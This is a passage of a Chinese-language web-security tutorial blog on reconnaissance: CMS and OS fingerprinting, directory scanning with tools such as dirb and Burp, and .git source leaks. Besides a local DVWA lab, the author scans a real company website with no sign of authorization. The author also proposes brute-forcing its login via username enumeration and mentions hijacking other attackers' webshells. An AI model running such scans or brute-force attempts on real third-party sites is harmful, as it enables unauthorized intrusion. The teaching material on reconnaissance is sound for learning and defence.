class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">2003</span> powereasy.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">1691</span> qibosoft.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>           <span class="number">1428</span> siteserver.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>            <span class="number">795</span> southidc.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>           <span class="number">1106</span> wordpress.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>           <span class="number">1107</span> z<span class="literal">-blog</span>.txt</span><br></pre></td></tr></table></figure>



<p>比如<code>wordpress.txt</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#范例：链接------关键字------CMS别称</span></span><br><span class="line"><span class="comment">#范例：连接------正则表达式------匹配关键字------CMS别称</span></span><br><span class="line">/robots.txt------wordpress------WordPress</span><br><span class="line">/license.txt------wordpress------WordPress</span><br><span class="line">/readme.txt------wordpress------WordPress</span><br><span class="line">/<span class="built_in">help</span>.txt------wordpress------WordPress</span><br><span class="line">/readme.html------wordpress------WordPress</span><br><span class="line">/readme.htm------wordpress------WordPress</span><br><span class="line">/wp-admin/css/colors-classic.css------wordpress------WordPress</span><br><span class="line">/wp-admin/js/media-upload.dev.js------wordpress------WordPress</span><br><span class="line">/wp-content/plugins/akismet/akismet.js------wordpress------WordPress</span><br><span class="line">/wp-content/themes/classic/rtl.css------wordpress------WordPress</span><br><span class="line">/wp-content/themes/twentyeleven/readme.txt------wordpress------WordPress</span><br><span class="line">/wp-content/themes/twentyten/style.css------wordpress------WordPress</span><br><span class="line">/wp-includes/css/buttons.css------wordpress------WordPress</span><br><span class="line">/wp-includes/js/scriptaculous/wp-scriptaculous.js------wordpress------WordPress</span><br><span class="line">/wp-includes/js/tinymce/langs/wp-langs-en.js------wordpress------WordPress</span><br><span class="line">/wp-includes/js/tinymce/wp-tinymce.js------wordpress------WordPress</span><br><span class="line">/wp-includes/wlwmanifest.xml------wordpress------WordPress</span><br></pre></td></tr></table></figure>

<p>御剑在运行的时候会遍历每一个CMS的指纹文件的每一行,然后去该网站<code>http://www.sdtxsn.com/</code>找</p>
<p>对<code>/robots.txt------wordpress------WordPress</code>这一行</p>
<p>御剑就会尝试访问<code>http://www.sdtxsn.com/robots.txt</code>然后从里面寻找有没有wordpress字样,如果有则判定为wordpress CMS</p>
<p>显然这样判断是很武断的,稍微做一点手脚就可以骗过御剑</p>
<p>比如本地的DVWA靶场,在其根目录下robots.txt最后写一行<code>wordpress</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604170813339.png" alt="image-20220604170813339"></p>
<p>保存之后用御剑去查</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604170832582.png" alt="image-20220604170832582"></p>
<p>御剑检查到wordpress.txt的第一行就是<code>robots.txt</code>然后去<code>192.168.3.2/DVWA</code>查该文件,发现有<code>wordpress</code>字样,于是就武断地认为是wordpress建的站.后面的检查也不做了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604170937466.png" alt="image-20220604170937466"></p>
<p>要想让御剑继续检查就把wordpress.txt中关于<code>robots.txt</code>那一行注释掉</p>
<p>随着我们逐步了解更多CMS还有指纹信息,我们也可以拓展御剑的指纹字典或者新添加CMS指纹,增强御剑的功能</p>
<h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# whatweb http://www.sdtxsn.com/</span><br><span class="line">http://www.sdtxsn.com/ [200 OK] All-in-one-SEO-Pack[2.3.11.1], Country[CHINA][CN], HTML5, HTTPServer[nginx/1.4.4], IP[121.36.56.23], JQuery[1.12.4,1.8.3], Modernizr[2.7.1.min], PHP[5.4.23], Script[text/javascript], Title[山东泰西水泥有限公 司 |], UncommonHeaders[<span class="built_in">link</span>], WordPress, X-Powered-By[PHP/5.4.23], X-UA-Compatible[IE=edge], nginx[1.4.4]</span><br></pre></td></tr></table></figure>

<p>php版本,cms类型,服务器类型和版本都查到了</p>
<p>查本地的DVWA靶场</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# whatweb http://192.168.3.2/DVWA</span><br><span class="line">http://192.168.3.2/DVWA [301 Moved Permanently] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], IP[192.168.3.2], OpenSSL[1.1.1b], RedirectLocation[http://192.168.3.2/DVWA/], Title[301 Moved Permanently]</span><br><span class="line">http://192.168.3.2/DVWA/ [302 Found] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Cookies[PHPSESSID,security], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], HttpOnly[PHPSESSID,security], IP[192.168.3.2], OpenSSL[1.1.1b], PHP[5.6.9], RedirectLocation[login.php], X-Powered-By[PHP/5.6.9]</span><br><span class="line">http://192.168.3.2/DVWA/login.php [302 Found] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Cookies[PHPSESSID,security], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], HttpOnly[PHPSESSID,security], IP[192.168.3.2], OpenSSL[1.1.1b], PHP[5.6.9], RedirectLocation[setup.php], X-Powered-By[PHP/5.6.9]</span><br><span class="line">http://192.168.3.2/DVWA/setup.php [200 OK] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Cookies[PHPSESSID,security], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], HttpOnly[PHPSESSID,security], IP[192.168.3.2], OpenSSL[1.1.1b], PHP[5.6.9], Script[text/javascript], Title[Setup :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*], X-Powered-By[PHP/5.6.9]</span><br></pre></td></tr></table></figure>

<p>查不到CMS信息,因为这个靶场压根就没有用CMS建站</p>
<p>但是查到了操作系统Win64,服务器中间件Apache,php版本5.6.9等信息</p>
<h3 id="操作系统指纹识别"><a href="#操作系统指纹识别" class="headerlink" title="操作系统指纹识别"></a>操作系统指纹识别</h3><p>whatweb等工具也有操作系统指纹识别的功能</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604191222243.png" alt="image-20220604191222243"></p>
<h4 id="curl-head"><a href="#curl-head" class="headerlink" title="curl --head &lt;URL&gt;"></a><code>curl --head &lt;URL&gt;</code></h4><p><code>curl</code>从终端上请求网页</p>
<p><code>--head</code>选项意思是返回数据包头,丢弃数据主体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# curl --<span class="built_in">head</span> http://www.sdtxsn.com/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.4.4</span><br><span class="line">Date: Sat, 04 Jun 2022 11:14:07 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.4.23</span><br><span class="line">Link: &lt;http://www.sdtxsn.com/?rest_route=/&gt;; rel=<span class="string">&quot;https://api.w.org/&quot;</span></span><br><span class="line">Link: &lt;http://www.sdtxsn.com/&gt;; rel=shortlink</span><br></pre></td></tr></table></figure>

<p>如果目标使用操作系统是Windows,服务器是IIS中间件则Server这里应该写Microsoft-IIS&#x2F;6.0(或者7.5等等版本)</p>
<blockquote>
<p>微软的操作系统版本一般是和IIS中间件挂钩的,比如</p>
<p>WinServer2003使用的是IIS6.0</p>
<p>WinServer2008使用的是IIS7.5</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604192537532.png" alt="image-20220604192537532"></p>
<p>win11上的IIS版本更高</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604192805045.png" alt="image-20220604192805045"></p>
</blockquote>
<p>而现在curl的返回值是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server: nginx/1.4.4</span><br></pre></td></tr></table></figure>

<p>表明目标是运行在nginx中间件上的,至于是Windows系统还是Linux系统尚未可知</p>
<p>实际上用浏览器直接访问目标然后用开发者工具也可以观察到数据包头</p>
<h4 id="nmap-O-A"><a href="#nmap-O-A" class="headerlink" title="nmap -O -A"></a><code>nmap -O -A</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap -O -A 192.168.43.44</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 19:28 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE         VERSION</span><br><span class="line">80/tcp  open  http            Apache httpd 2.4.39 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span>)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="number">8</span>).</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">39</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span></span><br><span class="line"><span class="number">135</span>/tcp open  msrpc           Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn     Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp open  microsoft-ds?</span><br><span class="line"><span class="number">902</span>/tcp open  ssl/vmware-auth VMware Authentication Daemon <span class="number">1.10</span> (Uses VNC, SOAP)</span><br><span class="line"><span class="number">912</span>/tcp open  vmware-auth     VMware Authentication Daemon <span class="number">1.0</span> (Uses VNC, SOAP)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里多处信息表明目标<code>192.168.43.44</code>是windows操作系统</p>
<h2 id="网站路径扫描"><a href="#网站路径扫描" class="headerlink" title="网站路径扫描"></a>网站路径扫描</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p>原理就是猜测一个网站的目录有什么,尝试去访问该目录,根据返回的状态码确定其存不存在</p>
<p>比如<code> http://www.sdtxsn.com/index.html</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604194452563.png" alt="image-20220604194452563"></p>
<p>404 NotFound的意思就是压根没有这个目录</p>
<p>但是尝试访问<code>http://www.sdtxsn.com/index.php</code></p>
<p>会自动跳转到<code>http://www.sdtxsn.com</code>说明该主页就是<code>index.php</code>,本网站的后端语言就是php</p>
<p>又如猜测会有一个登录用的<code>login.php</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604194700315.png" alt="image-20220604194700315"></p>
<p>尝试访问时得到返回状态码<code>403 Forbidden</code>,说明网站目录里有这个文件,但是没有访问权限</p>
<p>使用自动化的扫站工具,其基于上述原理,使用目录字典疯狂地向服务端发送请求,然后根据http返回状态判断该目录是否存在,是否可以访问</p>
<p>为啥要扫站?</p>
<p>1.有可能有后门文件比如<code>shell.php</code>,其中一句话木马口令有可能很简单比如’cmd’,这样就可以骑别人的马子</p>
<p>2.可能有些敏感文件没有妥当设置保护,能够直接访问</p>
<blockquote>
<p>robots.txt</p>
<p>后台</p>
<p>备份文件.bak,.sql,.txt,.zip,.tar,可能含有密码或者源代码</p>
<p>MySQL接口,比如phpMyAdmin</p>
<p>安装页面:建站一开始的安装页面,在建站完毕后及时删除,否则有可能导致重装</p>
<p>上传目录,通常是&#x2F;upload&#x2F;这种字样</p>
<p>编辑器漏洞</p>
</blockquote>
<p>3.可能有些文件的访问权限没有设置好,本应该以管理员登录才能访问,却能够通过URL直接访问,即越权漏洞</p>
<h3 id="本地自动化工具"><a href="#本地自动化工具" class="headerlink" title="本地自动化工具"></a>本地自动化工具</h3><h4 id="御剑1-5"><a href="#御剑1-5" class="headerlink" title="御剑1.5"></a>御剑1.5</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195203548.png" alt="image-20220604195203548"></p>
<p>这里御剑只是扫描到了稀松了了的东西,貌似御剑不会递归目录,他只会扫描指定到目录的下一层</p>
<h4 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h4><p>在dashboard上new scan,然后输入目标URL地址就可以扫站</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195619671.png" alt="image-20220604195619671"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195550098.png" alt="image-20220604195550098"></p>
<p>这里扫描到了一个后台登录文件<code>wp-login.php</code>,御剑的字典里就没有这个文件,此时就可以将他添加到御剑的目录字典里了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195707350.png" alt="image-20220604195707350"></p>
<p>后面就可以尝试暴力破解或者sql注入攻击或者社工等方式登录</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195936171.png" alt="image-20220604195936171"></p>
<p>用repeater重复发送多次之后仍然没有让输入验证码,可以考虑使用暴力破解攻击了</p>
<p>并且随便输入用户名密码尝试登录,其报告错误为<code>&lt;div id=&quot;login_error&quot;&gt;	&lt;strong&gt;错误&lt;/strong&gt;：无效用户名。 </code></p>
<p>还挺贴心地说用户名不对,这就可以让密码都是1,用sniper打用户名,直到获取到有效的用户名,再固定该用户名,sniper用密码字典打密码</p>
<p>这样就把复杂度从$m*n$降到了$m+n$</p>
<h4 id="wwwscan"><a href="#wwwscan" class="headerlink" title="wwwscan"></a>wwwscan</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Usage&gt;:  D:\web安全\twoScan\wwwscan.exe &lt;HostName|Ip&gt; [<span class="type">Options</span>]</span><br><span class="line">&lt;Options&gt;:</span><br><span class="line">          <span class="literal">-p</span> port        : <span class="built_in">set</span> http/https port</span><br><span class="line">          <span class="literal">-m</span> thread      : <span class="built_in">set</span> max thread</span><br><span class="line">          <span class="literal">-t</span> timeout     : tcp timeout <span class="keyword">in</span> seconds</span><br><span class="line">          <span class="literal">-r</span> rootpath    : <span class="built_in">set</span> root path to scan</span><br><span class="line">          <span class="literal">-ssl</span>           : will use ssl</span><br><span class="line">&lt;Example&gt;:</span><br><span class="line">          D:\web安全\twoScan\wwwscan.exe www.target.com <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-m</span> <span class="number">10</span> <span class="literal">-t</span> <span class="number">16</span></span><br><span class="line">          D:\web安全\twoScan\wwwscan.exe www.target.com <span class="literal">-r</span> <span class="string">&quot;/test/&quot;</span> <span class="literal">-p</span> <span class="number">80</span></span><br><span class="line">          D:\web安全\twoScan\wwwscan.exe www.target.com <span class="literal">-ssl</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>-p指定目标端口</p>
<p>-m指定线程数</p>
<p>-t指定超时</p>
<p>-r指定次级目录,不写则为根目录</p>
</blockquote>
<p>首先使用nmap扫描端口,看看目标的web服务器是不是在80端口开放</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>&gt; nmap www.sdtxsn.com</span><br><span class="line">Starting Nmap <span class="number">7.92</span> ( https://nmap.org ) at <span class="number">2022</span><span class="literal">-06-04</span> <span class="number">20</span>:<span class="number">08</span> 中国标准时间</span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.sdtxsn.com (<span class="number">121.36</span>.<span class="number">56.23</span>)</span><br><span class="line">Host is up (<span class="number">0.046</span>s latency).</span><br><span class="line">rDNS record <span class="keyword">for</span> <span class="number">121.36</span>.<span class="number">56.23</span>: ecs<span class="literal">-121-36-56-23</span>.compute.hwclouds<span class="literal">-dns</span>.com</span><br><span class="line">Not shown: <span class="number">966</span> filtered tcp ports (no<span class="literal">-response</span>), <span class="number">28</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh</span><br><span class="line"><span class="number">80</span>/tcp   open  http</span><br><span class="line"><span class="number">1024</span>/tcp open  kdm</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql</span><br><span class="line"><span class="number">3690</span>/tcp open  svn</span><br><span class="line"><span class="number">8888</span>/tcp open  sun<span class="literal">-answerbook</span></span><br></pre></td></tr></table></figure>

<p>确实如此,然后<code>wwwscan www.sdtxsn.com -p 80 -m 10 -t 4</code></p>
<p>但是结果wwwscan太逊了,啥也没扫到</p>
<h4 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h4><p>linux上的扫站工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb URL &lt;字典&gt;</span><br></pre></td></tr></table></figure>

<p>其字典在<code>/usr/share/dirb/wordlists/</code>下面放着</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/usr/share/dirb/wordlists]</span><br><span class="line">└─# <span class="built_in">ls</span> -l</span><br><span class="line">total 260</span><br><span class="line">-rw-r--r-- 1 root root 184073 Jan 25  2012 big.txt</span><br><span class="line">-rw-r--r-- 1 root root   1292 Jan 27  2012 catala.txt</span><br><span class="line">-rw-r--r-- 1 root root  35849 Nov 17  2014 common.txt</span><br><span class="line">-rw-r--r-- 1 root root   1492 May 23  2012 euskera.txt</span><br><span class="line">-rw-r--r-- 1 root root    142 Dec 29  2005 extensions_common.txt</span><br><span class="line">-rw-r--r-- 1 root root     75 Mar 16  2012 indexes.txt</span><br><span class="line">-rw-r--r-- 1 root root    244 Dec 29  2005 mutations_common.txt</span><br><span class="line">drwxr-xr-x 2 root root   4096 Apr 28 17:15 others</span><br><span class="line">-rw-r--r-- 1 root root   6561 Mar  5  2014 small.txt</span><br><span class="line">-rw-r--r-- 1 root root   3731 Nov 13  2014 spanish.txt</span><br><span class="line">drwxr-xr-x 2 root root   4096 Apr 28 17:15 stress</span><br><span class="line">drwxr-xr-x 2 root root   4096 Apr 28 17:15 vulns</span><br></pre></td></tr></table></figure>

<p>有很多本字典,甚至子文件夹里还有字典,可以把这些字典送给御剑等软件增强其功能</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# dirb http://www.sdtxsn.com/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jun  4 20:18:46 2022</span><br><span class="line">URL_BASE: http://www.sdtxsn.com/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://www.sdtxsn.com/ ----</span><br><span class="line">+ http://www.sdtxsn.com/admin.php (CODE:403|SIZE:570)</span><br><span class="line">--&gt; Testing: http://www.sdtxsn.com/alert</span><br></pre></td></tr></table></figure>



<h2 id="网站源码泄漏"><a href="#网站源码泄漏" class="headerlink" title="网站源码泄漏"></a>网站源码泄漏</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604204704933.png" alt="image-20220604204704933"></p>
<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><p>这个玩意的原理需要稍微学一下git的使用<a target="_blank" rel="noopener" href="https://www.runoob.com/git/git-basic-operations.html">Git 基本操作 | 菜鸟教程 (runoob.com)</a></p>
<p>这个锅应该是写CMS的一伙子程序员背</p>
<p>在<code>git init</code>初始化代码库之后会在工作目录下面生成<code>.git</code>隐藏文件</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604205017452.png" alt="image-20220604205017452"></p>
<p>这个玩意儿是用来记录代码变更记录的,方便代码写毁球的时候退回到早期的版本</p>
<p>这个目录默认是隐藏的,在windows上如果不设置查看隐藏文件是不会显示的</p>
<p>然后写CMS的一伙子人在发布其CMS源代码的时候忘记删除这个玩意儿了,建站的企业可能对这个玩意不甚了解,以为是网站支持文件,或者由于其隐藏根本不知道有这个东西.建立的网站根目录下就藏着这么一个<code>.git</code>目录</p>
<p>诚如是,我们就可以使用GitHack下载还原出源代码</p>
<p>具体怎么各操作呢?我们首先模拟一伙子写CMS的苦逼程序员,</p>
<h4 id="程序员视角"><a href="#程序员视角" class="headerlink" title="程序员视角"></a>程序员视角</h4><p>我们首先初始化一个版本管理仓库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; git init</span><br><span class="line">Reinitialized existing Git repository in D:/phpstudy_pro/WWW/AtomCMS/.git/</span><br></pre></td></tr></table></figure>

<p>我们经历千辛万苦,终于写好了一个后端(这里直接下载了一个AtomCMS)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\phpstudy_pro\WWW\AtomCMS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         2022/4/14     21:38                .idea</span><br><span class="line">d-----         2022/4/14     18:00                admin</span><br><span class="line">d-----         2022/4/13     21:12                config</span><br><span class="line">d-----         2022/4/13     21:21                functions</span><br><span class="line">d-----         2022/4/13     20:26                images</span><br><span class="line">d-----         2022/4/13     20:26                template</span><br><span class="line">d-----         2022/4/14     17:49                uploads</span><br><span class="line">d-----         2022/4/13     20:26                views</span><br><span class="line">d-----         2022/4/13     20:26                widgets</span><br><span class="line">------        2015/10/22      3:16             22 .gitignore</span><br><span class="line">------        2015/10/22      3:16            162 .htaccess</span><br><span class="line">------        2015/10/22      3:16            301 .project</span><br><span class="line">------        2015/10/22      3:16             12 CNAME</span><br><span class="line">------        2015/10/22      3:16           5048 database-video81.sql</span><br><span class="line">------        2015/10/22      3:16           4963 database.sql</span><br><span class="line">------        2015/10/22      3:16            176 index.php</span><br><span class="line">------        2015/10/22      3:16           9872 README.md</span><br></pre></td></tr></table></figure>

<p>然后我们保存此次版本,</p>
<p>首先将代码放到暂存区</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; git add .</span><br></pre></td></tr></table></figure>

<p>然后将暂存区提交到本地仓库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\phpstudy_pro\WWW\AtomCMS&gt; git commit</span><br><span class="line">Aborting commit due to empty commit message.</span><br></pre></td></tr></table></figure>

<p>然后我们将这些东西上传到了github供其他人下载使用,但是忘记删除.git目录了.</p>
<p>程序员的工作就完成了,下面我们站在用户视角</p>
<h4 id="用户视角"><a href="#用户视角" class="headerlink" title="用户视角"></a>用户视角</h4><p>用户在github上,下载了该CMS的源代码,.git也随之进入网站根目录,现在我们站在用户的视角,我们用phpstudy模拟建站的过程</p>
<p>建立网站之后,我们可以通过ip地址(内网模拟)或者域名(没买)访问该网站</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604210301690.png" alt="image-20220604210301690"></p>
<p>用户的工作就完成了</p>
<p>现在我们站在攻击者的视角.</p>
<h4 id="攻击者视角"><a href="#攻击者视角" class="headerlink" title="攻击者视角"></a>攻击者视角</h4><p>攻击者尝试访问<code>/.git</code>目录</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604210528946.png" alt="image-20220604210528946"></p>
<p>发现没有访问权限,这个文件夹是有可能存在的,不妨试一试</p>
<p>于是他拿出了GitHack</p>
